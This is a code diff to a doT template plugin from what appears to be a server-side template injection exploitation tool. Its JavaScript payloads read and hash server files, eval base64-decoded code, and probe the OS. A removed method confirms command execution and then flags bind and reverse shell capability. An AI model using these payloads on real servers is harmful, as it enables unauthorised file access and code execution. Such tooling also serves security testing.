@@ -29,8 +29,7 @@ class Dot(javascript.Javascript):
                 'md5': """global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('%(path)s')).digest("hex");"""
             },
             'evaluate' : {
-                'call': 'render',
-                'evaluate' : """eval(Buffer('%(code_b64)s', 'base64').toString())""",
+                'test_os': """global.process.mainModule.require('os').platform()""",
             },
             'execute' : {
                 'call': 'evaluate',
@@ -52,17 +51,3 @@ class Dot(javascript.Javascript):
             
         ])
         
-    def rendered_detected(self):
-
-        os = self.evaluate("""global.process.mainModule.require('os').platform()""")
-        if os and re.search('^[\w-]+$', os):
-            self.set('os', os)
-            self.set('evaluate', self.language)
-            self.set('write', True)
-            self.set('read', True)
-
-            expected_rand = str(rand.randint_n(2))
-            if expected_rand == self.execute('echo %s' % expected_rand):
-                self.set('execute', True)
-                self.set('bind_shell', True)
-                self.set('reverse_shell', True)
